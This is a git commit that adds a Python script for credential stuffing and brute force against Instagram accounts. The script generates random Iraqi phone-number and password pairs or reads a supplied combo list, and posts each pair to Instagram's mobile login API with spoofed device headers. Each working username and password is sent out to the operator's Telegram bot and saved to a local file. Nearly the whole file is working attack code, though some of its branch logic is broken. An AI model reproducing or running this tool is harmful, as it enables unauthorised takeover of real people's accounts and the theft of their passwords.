216d4c3286027b3111a034d3eb96ca3189bebac9
M A T I N 1879 <87310379+matin-1879@users.noreply.github.com>
2022-02-16 22:09:00 +0300

    Create k.py

---
+++ k.py
@@ -0,0 +1,272 @@
+#telegram @j_b_i
+import random, time, user_agent
+import os
+import sys
+import subprocess
+from bs4 import BeautifulSoup
+import json
+from uuid import uuid4
+import datetime
+from datetime import datetime
+from secrets import token_hex
+import secrets
+import requests
+
+
+#----------------------
+os.system("rm -rf combo.txt")
+try:os.remove("combo.txt")
+except:pass
+os.system('clear')
+#----------------------
+
+#---------------
+hits = 0
+bad = 0
+error = 0
+checkpoint = 0
+tottal = 0
+count = 0
+count2 = 0
+#---------------
+
+logo = """
+\033[1;91m
+▒██   ██▒ ▒█████    ██████  ██░ ██  ███▄    █  ▄▄▄       █     █░
+▒▒ █ █ ▒░▒██▒  ██▒▒██    ▒ ▓██░ ██▒ ██ ▀█   █ ▒████▄    ▓█░ █ ░█░
+░░  █   ░▒██░  ██▒░ ▓██▄   ▒██▀▀██░▓██  ▀█ ██▒▒██  ▀█▄  ▒█░ █ ░█ 
+ ░ █ █ ▒ ▒██   ██░  ▒   ██▒░▓█ ░██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ░█░ █ ░█ 
+▒██▒ ▒██▒░ ████▓▒░▒██████▒▒░▓█▒░██▓▒██░   ▓██░ ▓█   ▓██▒░░██▒██▓ 
+▒▒ ░ ░▓ ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▓░▒ ▒  
+░░   ░▒ ░  ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░░ ░░   ░ ▒░  ▒   ▒▒ ░  ▒ ░ ░  
+ ░    ░  ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░   ░   ░ ░   ░   ▒     ░   ░  
+ ░    ░      ░ ░        ░   ░  ░  ░         ░       ░  ░    ░  
+\033[0;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+\033[0;1m(\033[1;91m❗\033[0;1m) \033[96;1mAUTHOR\033[0;1m: \033[96;1mXOSHNAW SOFTWARE
+\033[0;1m(\033[1;91m❗\033[0;1m) \033[96;1mTELEGRAM\033[0;1m: \033[96;1m@Y_0_U
+\033[0;1m(\033[1;91m❗\033[0;1m) \033[96;1mCHANNEL\033[0;1m: \033[96;1m@TEAMCRACKEER
+\033[0;1m(\033[1;91m❗\033[0;1m) \033[96;1mGITHUB\033[0;1m: \033[96;1mGITHUB.COM/XOSHN4W
+\033[0;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+"""
+print(logo)
+ID=input("\n\033[96;1m( ⌯ ) ID TELEGRAM: ")
+os.system('clear')
+print(logo)
+token=input("\n\033[36;1m( ⌯ ) TOKEN BOT: ")
+os.system('clear')
+
+print(logo)
+xoshnaw = input("""\033[0;1m[ \033[31;1m1 \033[0;1m] - \033[32mCHECKER INSTAGRAM { RANDOM }
+\033[0;1m[ \033[31;1m2 \033[0;1m] - \033[32mCHECKER INSTAGRAM { NEED COMBO }
+\033[0;1m[ \033[31;1m3 \033[0;1m] - \033[32mCHECKER RANDOM { 0750 }
+\033[0;1m[ \033[31;1m4 \033[0;1m] - \033[32mCHECKER TWITTER { COMBO }
+\033[0;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n
+\033[36;1mHALLBZHERA: """)
+
+if xoshnaw=="1":
+		os.system('clear')
+		for i in range(10000):
+				nk=random.randint(1000000, 9999999)
+				sks=("+964750"+str(nk)+":"+str(nk))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(sks)+"\n")
+				tm=random.randint(1000000, 9999999)
+				ss=("+964772"+str(tm)+":0772"+str(tm))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(ss)+"\n")
+				yo=random.randint(1000000, 9999999)
+				sos=("+964771"+str(yo)+":0771"+str(yo))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(sos)+"\n")
+				nk=random.randint(1000000, 9999999)
+				sks=("+964750"+str(nk)+":"+str(nk))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(sks)+"\n")
+				kl=random.randint(1000000, 9999999)
+				ssl=("+964751"+str(kl)+":"+str(kl))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(ssl)+"\n")
+				uo=random.randint(1000000, 9999999)
+				po=("+964780"+str(uo)+":0780"+str(uo))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(po)+"\n")
+				uK=random.randint(1000000, 9999999)
+				KO=("+964781"+str(uK)+":"+str(uK))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(KO)+"\n")
+				oi=random.randint(1000000, 9999999)
+				oe=("+964750"+str(oi)+":"+str(oi))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(oe)+"\n")
+				qn=random.randint(1000000, 9999999)
+				qe=("+964782"+str(qn)+":0782"+str(qn))
+				with open("combo.txt", "a") as bo:
+					bo.write(str(qe)+"\n")
+		ker="combo.txt"
+		file=open(ker,"r").read().splitlines()
+		for jrt in file:
+			user=jrt.split(':')[0]
+			pasw=jrt.split(':')[1]
+			req = requests.session()
+			url = 'https://i.instagram.com/api/v1/accounts/login/'
+			headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
+             'Accept':'*/*', 
+             'Cookie':'missing', 
+             'Accept-Encoding':'gzip, deflate', 
+             'Accept-Language':'en-US', 
+             'X-IG-Capabilities':'3brTvw==', 
+             'X-IG-Connection-Type':'WIFI', 
+             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
+             'Host':'i.instagram.com'}
+			uid = str(uuid4())
+			data = {'uuid':uid, 
+             'password':pasw, 
+             'username':user, 
+             'device_id':uid, 
+             'from_reg':'false', 
+             '_csrftoken':'missing', 
+             'login_attempt_countn':'0'}
+			r = req.post(url, headers=headers, data=data, allow_redirects=True)
+			if "logged_in_user" in r.text:
+					os.system('clear')
+					print(logo)
+					hits+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[32mTOTAL\033[0;1m: \033[1;91m80000\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+					yes = (f""" 
+  INSTAGRAM ACCOUNT 
+• = = = = = = = = = = = = •
+[•] 𝗘𝗠𝗔𝗜𝗟: {user}
+[•] 𝗣𝗔𝗦𝗦: {pasw}
+• = = = = = = = = = = = = •
+• TELE: @Y_0_U
+""")
+					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
+					with open('/sdcard/GOOD-INSTA.txt', 'a') as x:
+						x.write(f'\nGOOD: {user}:{pasw}')
+			elif 'check your username' or 'The password you entered is incorrect.' in log.text:
+					os.system('clear')
+					print(logo)
+					bad+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[32mTOTAL\033[0;1m: \033[1;91m80000\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+			else:
+					os.system('clear')
+					print(logo)
+					error+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[32mTOTAL\033[0;1m: \033[1;91m80000\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+
+#----------------------
+
+if xoshnaw=="2":
+		os.system('clear')
+		print(logo)
+		c0mbo=input(' \033[1;91m/PATH COMBO: ')
+		file=open(c0mbo,"r").read().splitlines()
+		for listcount in file:
+			count +=1
+		for jrt in file:
+			user=jrt.split(':')[0]
+			pasw=jrt.split(':')[1]
+			req = requests.session()
+			url = 'https://i.instagram.com/api/v1/accounts/login/'
+			headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
+             'Accept':'*/*', 
+             'Cookie':'missing', 
+             'Accept-Encoding':'gzip, deflate', 
+             'Accept-Language':'en-US', 
+             'X-IG-Capabilities':'3brTvw==', 
+             'X-IG-Connection-Type':'WIFI', 
+             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
+             'Host':'i.instagram.com'}
+			uid = str(uuid4())
+			data = {'uuid':uid, 
+             'password':pasw, 
+             'username':user, 
+             'device_id':uid, 
+             'from_reg':'false', 
+             '_csrftoken':'missing', 
+             'login_attempt_countn':'0'}
+			r = req.post(url, headers=headers, data=data, allow_redirects=True)
+			if "logged_in_user" in r.text:
+					os.system('clear')
+					print(logo)
+					hits+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTOTAL\033[0;1m: \033[1;91m{count}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+					yes = (f""" 
+  INSTAGRAM ACCOUNT 
+• = = = = = = = = = = = = •
+[•] 𝗘𝗠𝗔𝗜𝗟: {user}
+[•] 𝗣𝗔𝗦𝗦: {pasw}
+• = = = = = = = = = = = = •
+• TELE: @Y_0_U
+""")
+					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
+					with open('/sdcard/GOOD-INSTA.txt', 'a') as x:
+						x.write(f'\nGOOD: {user}:{pasw}')
+			elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in t.text:
+					os.system('clear')
+					print(logo)
+					bad+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTOTAL\033[0;1m: \033[1;91m{count}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+			else:
+					os.system('clear')
+					print(logo)
+					error+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTOTAL\033[0;1m: \033[1;91m{count}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+
+#-----------------------------
+if xoshnaw=="3":
+	nmuna = '9870546123'
+	while True:
+			ker = str(''.join((random.choice(nmuna) for i in range(7))))
+			user = '+964750' + ker
+			pasw = ker
+			tottal+=1
+			req = requests.session()
+			log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+			uid = str(uuid4())
+			log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+			r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+			if "logged_in_user" in r.text:
+					os.system('clear')
+					print(logo)
+					hits+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTOTAL\033[0;1m: \033[1;91m{tottal}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+					yes = (f""" 
+  INSTAGRAM ACCOUNT 
+• = = = = = = = = = = = = •
+[•] 𝗘𝗠𝗔𝗜𝗟: {user}
+[•] 𝗣𝗔𝗦𝗦: {pasw}
+• = = = = = = = = = = = = •
+• TELE: @Y_0_U
+""")
+					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
+					with open('/sdcard/GOOD-INSTA.txt', 'a') as x:
+						x.write(f'\nGOOD: {user}:{pasw}')
+			elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in t.text:
+					os.system('clear')
+					print(logo)
+					bad+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTOTAL\033[0;1m: \033[1;91m{tottal}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+			else:
+					os.system('clear')
+					print(logo)
+					error+=1
+					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTOTAL\033[0;1m: \033[1;91m{tottal}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
+if xoshnaw=="4":
+	os.system('python 1.py')
